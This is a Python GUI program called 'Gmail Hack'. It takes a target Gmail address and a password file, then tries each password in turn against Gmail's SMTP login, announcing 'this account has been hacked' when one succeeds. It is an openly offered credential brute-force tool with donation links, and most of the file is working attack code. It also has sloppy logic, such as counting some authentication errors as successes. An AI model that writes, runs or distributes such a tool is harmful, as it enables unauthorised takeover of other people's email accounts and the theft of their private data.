#!/usr/bin/python3
# Coded by Adrijan P.
# Gmail Hack

import PySimpleGUI as sg
import pyperclip
import smtplib
from os import system
from json import (load as jsonload, dump as jsondump)
from os import path
import webbrowser



def pass_l(filename):
    pass_file = open(filename, 'r')
    return pass_file.readlines()





SETTINGS_FILE = path.join(path.dirname(__file__), r'settings_file.cfg')
DEFAULT_SETTINGS = {'theme': sg.theme()}
SETTINGS_KEYS_TO_ELEMENT_KEYS = {'theme': '-THEME-'}

def load_settings(settings_file, default_settings):
    try:
        with open(settings_file, 'r') as f:
            settings = jsonload(f)
    except Exception as e:
        sg.popup_quick_message(f'exception {e}', 'No settings file found... will create one for you', keep_on_top=True, background_color='red', text_color='white')
        settings = default_settings
        save_settings(settings_file, settings, None)
    return settings


def save_settings(settings_file, settings, values):
    if values:      
        for key in SETTINGS_KEYS_TO_ELEMENT_KEYS:  
            try:
                settings[key] = values[SETTINGS_KEYS_TO_ELEMENT_KEYS[key]]
            except Exception as e:
                print(f'Problem updating settings from window values. Key = {key}')

    with open(settings_file, 'w') as f:
        jsondump(settings, f)

    sg.popup('Settings saved')

def create_settings_window(settings):
    sg.theme(settings['theme'])

    def TextLabel(text): return sg.Text(text+':', justification='r', size=(15,1))

    layout = [  [sg.Text('Settings', font='Any 15')],
                [TextLabel('Theme'),sg.Combo(sg.theme_list(), size=(20, 20), key='-THEME-')],
                [sg.Button('Save'), sg.Button('Exit')]  ]

    window = sg.Window('Settings', layout, keep_on_top=True, finalize=True)

    for key in SETTINGS_KEYS_TO_ELEMENT_KEYS:
        try:
            window[SETTINGS_KEYS_TO_ELEMENT_KEYS[key]].update(value=settings[key])
        except Exception as e:
            print(f'Problem updating PySimpleGUI window from settings. Key = {key}')

    return window


def create_main_window(settings):
    sg.theme(settings['theme'])
    menu_def = [['&Menu', ['&Copy', '&Paste','Settings', 'E&xit']],
                ['&Help', '&About...']]

    right_click_menu = ['Unused', ['&Copy', '&Paste','Settings', 'E&xit']]

    layout = [[sg.Menu(menu_def)],
              [sg.Text('', size=(32,1), font=('Helvetica', 9)),
                 sg.Button('', key='paypal', size=(12,1), font=('Helvetica', 9), button_color=(sg.theme_background_color(), sg.theme_background_color()),
                           image_filename='png/paypal.png', image_size=(80, 50), image_subsample=2, border_width=0),
                 sg.Button('', key='bitcoin', size=(12,1), font=('Helvetica', 9), button_color=(sg.theme_background_color(), sg.theme_background_color()),
                           image_filename='png/bitcoin.png', image_size=(80, 60), image_subsample=2, border_width=0)],   
              [sg.Output(size=(55, 14), key='out', font=('Helvetica', 9))],
              [sg.Text('Enter Gmail here ', size=[40, 1], font=('Helvetica', 9))],  
              [sg.Input(size=(57,1), key='-mail-', font=('Helvetica', 9))],
              [sg.Text('Select passwords file ', font=('Helvetica', 9), size=(20,1))],
              [sg.In(size=(48, 1),key='-passw-'), sg.FileBrowse()],
              [sg.Button('Hack', font=('Helvetica', 9), size=(8, 1), bind_return_key=True)]]

    return sg.Window('Gmail Hack',
                     layout=layout,
                     right_click_menu=right_click_menu)       



def main():
    window, settings = None, load_settings(SETTINGS_FILE, DEFAULT_SETTINGS )
    while True:
        if window is None:
            window = create_main_window(settings)
        event, values = window.Read(timeout=10)
        if event in (None, 'Exit'):
            break

        elif event == 'Hack':
            user_name = values['-mail-']
            filename = values['-passw-']
            pass_list = pass_l(filename)
            i = 0
            for password in pass_list:
                i = i + 1
                print (str(i) + '/' + str(len(pass_list)))
                server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
                server.ehlo()
                try:
                    server.login(user_name, password)
                    system('clear')
                    print ('\n')
                    print ('[+] this account has been hacked, password :' + password + '     ^_^')
                except smtplib.SMTPAuthenticationError as e:
                    error = str(e)
                    if error[14] == '<':
                        system('clear')
                        print ('[+] this account has been hacked, password :' + password + '     ^_^')
                    else:
                        print ('[!] password not found => ' + password)
            
            
        elif event == 'Settings':
            event, values = create_settings_window(settings).read(close=True)
            if event == 'Save':
                window.close()
                window = None
                save_settings(SETTINGS_FILE, settings, values)

        elif event == 'Copy':
            info = values['-main-']
            pyperclip.copy(str(info))
            pyperclip.paste()


        elif event == 'Paste':
            text = pyperclip.paste()
            window.Element('-mail-').Update(str(text))



        elif event == 'paypal':
            webbrowser.open_new_tab("https://www.paypal.com/donate/?cmd=_s-xclick&hosted_button_id=PFB6A6HLAQHC2&source=url")
        
        elif event == 'bitcoin':
            webbrowser.open_new_tab("https://commerce.coinbase.com/checkout/149a6235-ec7e-4d3b-a1ae-b08c4f08b4f6")

        elif event == 'About...':
            window.disappear()
            sg.popup('About:', 'Created by Adrijan P.', 'Gmail Hack', 'Version 1.1')
            window.reappear()


    
    window.Close()
    
main()

